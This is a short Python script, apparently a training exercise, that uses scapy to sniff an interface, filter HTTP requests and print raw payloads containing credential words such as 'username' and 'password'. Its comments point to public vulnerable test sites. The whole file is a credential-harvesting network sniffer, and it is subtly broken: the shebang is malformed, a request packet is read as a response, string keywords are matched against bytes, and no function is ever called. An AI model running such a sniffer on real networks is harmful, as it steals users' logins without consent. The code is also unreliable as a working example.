#/usr/bin/env python
from scapy.all import sniff, Raw
from scapy.layers import http

# UName, UPass are our username and password
keywords =["username", "password", "login", "email", "pass", "log", "UName", "UPass"]

def sniff_interface(interface, process_packet):
    # sniff(er) Arguments:
    # store=False: tells scapy not to store the packets in memory.
    # prn=[CALL_BACK_FUNCTION]:
    # filter="": tcp, udp, port #, arp, * not used here
    # Filter http packets with a third party module
    sniff(iface=interface, store=False, prn=process_packet)

def get_http(packet):
    # Only works currently with http test sites
    # http://testasp.vulnweb.com/Default.asp
    # http://www.pentest-standard.org/index.php/Main_Page
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPResponse].Path
        print(url)
    else:
        print("Packet has no http.HTTPRequest")

def process_sniffed_packet(packet):
    # For http only (which barely exists but good as a training exercise.
    # If our packet has a http layer
    if packet.haslayer(http.HTTPRequest):
        # if our packet http has a Raw layer
        # This works testing with http://testasp.vulnweb.com/Default.asp?
        # On login.  Loading the site does not return a POST request
        if packet.haslayer(Raw):
            # Print the load details, which should contain the UN and PW
            load = packet[Raw].load
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break

